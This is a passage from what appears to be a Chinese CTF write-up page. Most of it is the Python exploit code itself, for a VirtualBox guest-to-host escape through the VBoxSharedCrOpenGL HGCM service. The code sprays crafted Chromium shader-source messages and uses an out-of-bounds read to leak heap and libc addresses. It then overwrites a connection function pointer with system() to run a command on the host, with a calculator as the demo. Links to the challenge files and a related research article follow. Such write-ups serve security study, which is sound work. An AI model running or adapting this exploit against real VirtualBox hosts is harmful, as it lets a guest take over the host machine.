              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;IIIIII"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x1a</span><span class="o">+</span><span class="mi">2</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">+</span><span class="s1">'A'</span><span class="o">*</span><span class="mi">9</span>
        <span class="sd">'''</span>
<span class="sd">        msg2= pack("&lt;III", CR_MESSAGE_OPCODES, 0x41414141, 1) \</span>
<span class="sd">              + '\0\0\0' + chr(CR_EXTEND_OPCODE) \</span>
<span class="sd">              + 'aaaa' \</span>
<span class="sd">              + pack("&lt;I", CR_SHADERSOURCE_EXTEND_OPCODE) \</span>
<span class="sd">              + pack("&lt;IIIII", 0, 0x2, 0, 0x1, 0x1a+2) +'A'*4</span>
<span class="sd">        '''</span>
        <span class="n">msg2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'aaaa'</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_SHADERSOURCE_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;IIIII"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x1a</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span><span class="s1">'A'</span><span class="o">*</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
        <span class="n">msg3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="s1">'aaaa'</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_SHADERSOURCE_EXTEND_OPCODE</span><span class="p">)</span> \
              <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;IIIII"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x1a</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span><span class="s1">'A'</span><span class="o">*</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mh">0x260</span><span class="p">)</span> 
        <span class="n">msg4</span> <span class="o">=</span> <span class="n">make_oob_read</span><span class="p">(</span><span class="mh">0x570</span><span class="p">)</span>
        <span class="n">msg4</span><span class="o">+=</span> <span class="s1">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x290</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">msg4</span><span class="p">))</span>
        <span class="n">bufs</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">bufs2</span><span class="o">=</span> <span class="p">[]</span>
        <span class="n">bufs3</span><span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x4000</span><span class="p">):</span>
                <span class="n">bufs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
                <span class="n">bufs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg2</span><span class="p">),</span> <span class="n">msg2</span><span class="p">))</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
                <span class="n">bufs2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">msg4</span><span class="p">),</span><span class="n">msg4</span><span class="p">))</span>
                <span class="n">bufs3</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg3</span><span class="p">),</span> <span class="n">msg3</span><span class="p">))</span>
                <span class="n">alloc_buf</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg3</span><span class="p">),</span> <span class="n">msg3</span><span class="p">)</span>
        
    
        <span class="n">_</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="n">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span><span class="p">,</span> <span class="p">[</span><span class="n">bufs</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="s2">"A"</span><span class="o">*</span><span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span> <span class="o">=</span> <span class="mh">0x0a0a0000</span><span class="o">+</span><span class="n">bufs</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">];</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span> <span class="o">=</span> <span class="mh">0x0a0135</span><span class="p">;</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span> <span class="n">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span><span class="p">,</span> <span class="p">[</span><span class="n">bufs3</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s2">"A"</span><span class="o">*</span><span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">])</span>
<span class="err">​</span>
    <span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1">#self.leak_stuff()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">setup_write</span><span class="p">()</span>
        <span class="n">client</span><span class="o">=</span><span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
            <span class="n">new_client</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
            <span class="n">set_version</span><span class="p">(</span><span class="n">new_client</span><span class="p">)</span>
            <span class="n">client</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_client</span><span class="p">)</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="s1">'B'</span><span class="o">*</span><span class="mi">8</span>
        <span class="n">pay2</span><span class="o">=</span> <span class="s1">'C'</span><span class="o">*</span><span class="mi">8</span>
        <span class="n">buf</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span><span class="p">,</span><span class="mh">0x420</span><span class="p">,</span><span class="n">pay</span><span class="p">])</span>
        <span class="n">_</span><span class="p">,</span><span class="n">leak</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="n">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span><span class="p">,[</span><span class="mh">0x42424242</span><span class="p">,</span><span class="s1">'A'</span><span class="o">*</span><span class="mh">0x290</span><span class="p">,</span><span class="mh">0x290</span><span class="p">])</span> 
        <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">,</span><span class="o">=</span><span class="n">unpack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">leak</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span><span class="mh">0xe10</span><span class="o">+</span><span class="mh">0x870</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked conn @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">)</span>
        
        <span class="n">buf</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span><span class="p">,</span><span class="mh">0xdf0</span><span class="o">-</span><span class="mh">0x160</span><span class="p">,</span><span class="n">pay2</span><span class="p">])</span>
        <span class="n">buf</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="mi">13</span><span class="p">,[</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">write_buf_size</span><span class="p">,</span><span class="mh">0xe30</span><span class="o">-</span><span class="mh">0x160</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span><span class="mh">0x15c8</span><span class="p">)])</span>
        <span class="n">_</span><span class="p">,</span><span class="n">leak2</span><span class="p">,</span><span class="n">_</span><span class="o">=</span><span class="n">hgcm_call</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client1</span><span class="p">,</span><span class="n">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span><span class="p">,[</span><span class="mh">0x43434343</span><span class="p">,</span><span class="s1">'A'</span><span class="o">*</span><span class="mh">0x290</span><span class="p">,</span><span class="mh">0x290</span><span class="p">])</span>
        <span class="n">i</span><span class="p">,</span><span class="o">=</span><span class="n">unpack</span><span class="p">(</span><span class="s2">"&lt;Q"</span><span class="p">,</span><span class="n">leak2</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client3</span> <span class="o">=</span> <span class="n">i</span><span class="o">&gt;&gt;</span><span class="mi">32</span>
        <span class="c1">#self.read(self.pConn ,0x200, canfail= True)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">client</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">client</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">!=</span><span class="bp">self</span><span class="o">.</span><span class="n">client3</span><span class="p">:</span>
                <span class="n">hgcm_disconnect</span><span class="p">(</span><span class="n">client</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">crVBoxHGCMFree</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span> <span class="o">+</span> <span class="n">OFFSET_CONN_FREE</span><span class="p">,</span><span class="n">canfail</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked crVBoxHGCMFree @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="n">crVBoxHGCMFree</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">system</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read64</span><span class="p">(</span><span class="n">crVBoxHGCMFree</span><span class="o">-</span><span class="n">crVBoxHGCMFree_off</span><span class="o">+</span><span class="n">vbox_puts_off</span><span class="p">,</span><span class="n">canfail</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">-</span><span class="n">libc_puts_off</span><span class="o">+</span><span class="n">libc_system_off</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'[*] Leaked system @ 0x</span><span class="si">%016x</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="s1">'/snap/bin/gnome-calculator</span><span class="se">\x00</span><span class="s1">'</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write64</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="o">+</span><span class="mh">0x128</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pConn</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
        <span class="n">hgcm_disconnect</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">client3</span><span class="p">)</span>
        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
        <span class="k">return</span>
<span class="err">​</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">Pwn</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>
    <span class="c1">#if raw_input('you want RIP control? [y/n] ').startswith('y'):</span>
    <span class="c1">#    p.rip(0xdeadbeef)</span>
<span class="err">​</span>
</code></pre></div><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg" data-caption="" data-size="normal" data-rawwidth="1690" data-rawheight="894" class="origin_image zh-lightbox-thumb" width="1690" data-original="https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg"></noscript><img src="https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg" data-caption="" data-size="normal" data-rawwidth="1690" data-rawheight="894" class="origin_image zh-lightbox-thumb lazy" width="1690" data-original="https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg"></figure><p><b>其他相关链接</b></p><a href="http://link.zhihu.com/?target=https%3A//drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view%3Fusp%3Dsharing" data-draft-node="block" data-draft-type="link-card" class=" wrap external" target="_blank" rel="nofollow noreferrer">题目附件</a><a href="http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry" data-draft-node="block" data-draft-type="link-card" class=" wrap external" target="_blank" rel="nofollow noreferrer">Better slow than sorry - VirtualBox 3D acceleration considered harmful</a><p></p>